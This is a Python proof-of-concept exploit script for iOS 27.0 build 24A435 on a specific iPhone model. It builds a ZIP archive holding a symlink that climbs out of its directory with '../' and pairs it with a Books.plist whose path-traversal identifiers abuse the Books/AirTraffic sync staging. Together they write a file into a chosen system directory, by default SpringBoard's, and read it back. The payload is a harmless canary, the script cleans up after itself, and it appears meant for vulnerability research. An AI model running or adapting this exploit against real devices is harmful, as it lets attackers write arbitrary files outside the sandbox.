#!/usr/bin/env python3
"""Fresh-file write and export-readback PoC for iOS 27.0 (24A435)."""

from __future__ import annotations

import argparse
import hashlib
import io
import json
import os
import plistlib
import posixpath
import secrets
import stat
import struct
import subprocess
import sys
import tempfile
import zipfile
from pathlib import Path
from typing import Any


PRODUCT = "iPhone18,2"
VERSION = "27.0"
BUILD = "24A435"
DEFAULT_TARGET = "/var/mobile/Library/SpringBoard"
AIRLOCK_ROOT = "/var/mobile/Media/Airlock/Book"
SZ_EXTRA_ID = 0x5A53

ROOT = Path(__file__).resolve().parent
DEVICE_HELPER = ROOT / "build" / "device_helper"
AIRTRAFFIC_HOST = ROOT / "build" / "airtraffic_host"


class AirLiftError(RuntimeError):
    pass


def device_version(properties: dict[str, Any]) -> str:
    value = (
        properties.get("software", {})
        .get("osVersionNumber", {})
        .get("stringValue")
    )
    return value if isinstance(value, str) else "unknown"


def device_build(properties: dict[str, Any]) -> str:
    value = (
        properties.get("software", {})
        .get("osBuildVersions", {})
        .get("buildVersion", {})
        .get("name")
    )
    return value if isinstance(value, str) else "unknown"


def available_devices(devices: list[dict[str, Any]]) -> list[dict[str, str]]:
    matches: list[dict[str, str]] = []
    for device in devices:
        properties = device.get("properties", {})
        connection = properties.get("connection", {})
        hardware = properties.get("hardware", {})
        state = properties.get("state", {})
        udid = hardware.get("udid")
        if not (
            hardware.get("reality") == "physical"
            and hardware.get("productType") == PRODUCT
            and connection.get("pairingState") == "paired"
            and connection.get("state") == "connected"
            and device_version(properties) == VERSION
            and device_build(properties) == BUILD
            and isinstance(udid, str)
            and udid
        ):
            continue

        transport = {
            "localNetwork": "Wi-Fi",
            "wired": "USB",
        }.get(connection.get("transportType"), "connected")
        name = state.get("name")
        model = hardware.get("marketingName")
        matches.append(
            {
                "name": name if isinstance(name, str) and name else PRODUCT,
                "model": model if isinstance(model, str) and model else PRODUCT,
                "transport": transport,
                "udid": udid,
            }
        )
    return sorted(matches, key=lambda item: (item["name"], item["udid"]))


def choose_device(devices: list[dict[str, str]], requested: str | None) -> str:
    if not devices:
        raise AirLiftError(
            f"no connected paired {PRODUCT} on iOS {VERSION} ({BUILD}) found"
        )

    if requested:
        for device in devices:
            if device["udid"].casefold() == requested.casefold():
                return device["udid"]
        raise AirLiftError("requested device is not connected and compatible")

    if not sys.stdin.isatty():
        raise AirLiftError("device selection requires a terminal or --device UDID")

    print("Available compatible iPhones:", file=sys.stderr)
    for index, device in enumerate(devices, 1):
        print(f"  [{index}] {device['name']}", file=sys.stderr)
        print(
            f"      {device['model']} · iOS {VERSION} ({BUILD}) · "
            f"{device['transport']}",
            file=sys.stderr,
        )
        print(f"      {device['udid']}", file=sys.stderr)

    while True:
        print("Select device: ", end="", file=sys.stderr, flush=True)
        try:
            value = sys.stdin.readline()
        except KeyboardInterrupt as error:
            print(file=sys.stderr)
            raise AirLiftError("device selection cancelled") from error
        if not value:
            raise AirLiftError("device selection cancelled")
        try:
            selection = int(value.strip())
        except ValueError:
            selection = 0
        if 1 <= selection <= len(devices):
            return devices[selection - 1]["udid"]
        print(f"Enter a number from 1 to {len(devices)}.", file=sys.stderr)


def resolve_device(requested: str | None) -> str:
    command = [
        "xcrun",
        "devicectl",
        "list",
        "devices",
        "--timeout",
        "8",
        "--quiet",
        "--json-output",
        "-",
        "--omit-deprecated-fields-in-json",
    ]
    completed = subprocess.run(
        command,
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        timeout=12,
    )
    devices = json.loads(completed.stdout)["result"]["devices"]
    return choose_device(available_devices(devices), requested)


def normalize_target(value: str) -> str:
    target = posixpath.normpath(value)
    if not target.startswith("/") or target == "/" or "\x00" in target:
        raise AirLiftError("target must be a non-root absolute directory")
    components = target[1:].split("/")
    if any(component in ("", ".", "..") for component in components):
        raise AirLiftError("target contains an unsafe path component")
    if len(target.encode()) > 768:
        raise AirLiftError("target path is too long")
    return target


def zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 9, 14, 5, 0, 0))
    info.create_system = 3
    info.compress_type = zipfile.ZIP_STORED
    info.external_attr = (mode & 0xFFFF) << 16
    info.extra = struct.pack("<HHH", SZ_EXTRA_ID, 2, mode & 0xFFFF)
    return info


def build_archive(target: str, payload: bytes) -> bytes:
    target_tail = target[1:]
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), payload)
    return output.getvalue()


def build_books(identifiers: list[str]) -> bytes:
    rows = [
        {"Persistent ID": identifier, "Item ID": str(index), "DSID": "1"}
        for index, identifier in enumerate(identifiers, 1)
    ]
    return plistlib.dumps({"Books": rows}, fmt=plistlib.FMT_BINARY, sort_keys=True)


def run_json(command: list[str], timeout: int) -> dict[str, Any]:
    completed = subprocess.run(
        command,
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=timeout,
    )
    result: dict[str, Any] | None = None
    for line in reversed(completed.stdout.splitlines()):
        try:
            value = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(value, dict):
            result = value
            break
    if result is None:
        raise AirLiftError(f"{Path(command[0]).name} returned no JSON result")
    result["exitCode"] = completed.returncode
    return result


def native(command: str, udid: str, *arguments: str) -> dict[str, Any]:
    return run_json(
        [os.fspath(DEVICE_HELPER), command, udid, *arguments], timeout=60
    )


def operation_ok(result: dict[str, Any]) -> bool:
    return bool(
        result.get("exitCode") == 0
        and result.get("targetGatePassed")
        and result.get("operation", {}).get("ok")
    )


def preflight(udid: str) -> None:
    result = native("probe", udid)
    operation = result.get("operation", {})
    if not operation_ok(result):
        raise AirLiftError("device/build preflight failed")
    if operation.get("booksSyncPlistPresent") is not False:
        raise AirLiftError("Books sync staging is already in use")


def attempt(
    udid: str,
    target: str,
    leaf: str,
    payload: bytes,
    *,
    recovery_only: bool,
) -> dict[str, Any]:
    token = secrets.token_hex(10)
    source = f"airlift-src-{BUILD}-{token}"
    link_destination = f"airlift-link-{BUILD}-{token}"
    recovered = f"airlift-recovered-{BUILD}-{token}"
    link_identifier = f"../../{source}/p0/p1/p2/link"
    target_path = posixpath.join(target, leaf)
    target_identifier = posixpath.relpath(target_path, AIRLOCK_ROOT)
    payload_identifier = f"../../{source}/payload"

    if recovery_only:
        identifiers = [link_identifier, target_identifier]
        destinations = [link_destination, recovered]
    else:
        identifiers = [link_identifier, payload_identifier, target_identifier]
        destinations = [
            link_destination,
            posixpath.join(link_destination, leaf),
            recovered,
        ]

    with tempfile.TemporaryDirectory(prefix="airlift-") as temporary:
        work = Path(temporary)
        archive_path = work / "payload.zip"
        books_path = work / "Books.plist"
        expected_path = work / "expected.bin"
        archive_path.write_bytes(build_archive(target, payload))
        books_path.write_bytes(build_books(identifiers))
        expected_path.write_bytes(payload)

        preflight(udid)
        stage: dict[str, Any] = {"operation": {"ok": False}}
        atc: dict[str, Any] = {"ok": False}
        operation_error: Exception | None = None
        try:
            stage = native(
                "stage",
                udid,
                source,
                link_destination,
                recovered,
                os.fspath(archive_path),
                os.fspath(books_path),
            )
            if operation_ok(stage):
                command = [os.fspath(AIRTRAFFIC_HOST), udid]
                for identifier, destination in zip(identifiers, destinations):
                    command.extend((identifier, destination))
                atc = run_json(command, timeout=120)
        except Exception as error:
            operation_error = error
        finally:
            finish = native(
                "finish",
                udid,
                source,
                link_destination,
                recovered,
                os.fspath(expected_path),
                target[1:],
                leaf,
            )

    operation = finish.get("operation", {})
    return {
        "stageSucceeded": operation_ok(stage),
        "airTrafficSucceeded": bool(atc.get("exitCode") == 0 and atc.get("ok")),
        "exactBytesRecovered": bool(operation.get("recoveredBytesMatch")),
        "cleanupComplete": bool(operation.get("cleanupComplete")),
        "targetAbsent": operation.get("targetAbsent"),
        "operationError": (
            type(operation_error).__name__ if operation_error else None
        ),
    }


def run(target: str, requested_device: str | None) -> dict[str, Any]:
    if not DEVICE_HELPER.is_file() or not AIRTRAFFIC_HOST.is_file():
        raise AirLiftError("helpers are not built; run make first")

    udid = resolve_device(requested_device)
    preflight(udid)
    leaf = f"airlift-canary-{BUILD}-{secrets.token_hex(16)}.bin"
    payload = (
        f"airlift canary\nbuild={BUILD}\nnonce={secrets.token_hex(24)}\n"
    ).encode()

    primary = attempt(
        udid, target, leaf, payload, recovery_only=False
    )
    recovery = None
    if not primary["exactBytesRecovered"]:
        if not primary["cleanupComplete"]:
            raise AirLiftError("primary cleanup was incomplete; refusing to continue")
        recovery = attempt(
            udid, target, leaf, payload, recovery_only=True
        )

    exact = primary["exactBytesRecovered"] or bool(
        recovery and recovery["exactBytesRecovered"]
    )
    clean = primary["cleanupComplete"] and (
        recovery is None or recovery["cleanupComplete"]
    )
    preflight(udid)
    return {
        "ok": bool(exact and clean),
        "targetDirectory": target,
        "generatedLeaf": leaf,
        "payloadLength": len(payload),
        "payloadSHA256": hashlib.sha256(payload).hexdigest(),
        "newFileWrite": "confirmed" if exact else "not-confirmed",
        "exportRead": "confirmed" if exact else "not-confirmed",
        "exactBytesRecovered": exact,
        "cleanupComplete": clean,
        "existingFileTargeted": False,
        "primary": primary,
        "dedicatedRecovery": recovery,
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--device", metavar="UDID", help="skip the device picker")
    arguments = parser.parse_args()
    try:
        result = run(normalize_target(arguments.target), arguments.device)
    except (AirLiftError, OSError, subprocess.SubprocessError, ValueError) as error:
        print(json.dumps({"ok": False, "error": str(error)}, sort_keys=True))
        return 1
    print(json.dumps(result, indent=2, sort_keys=True))
    return 0 if result["ok"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
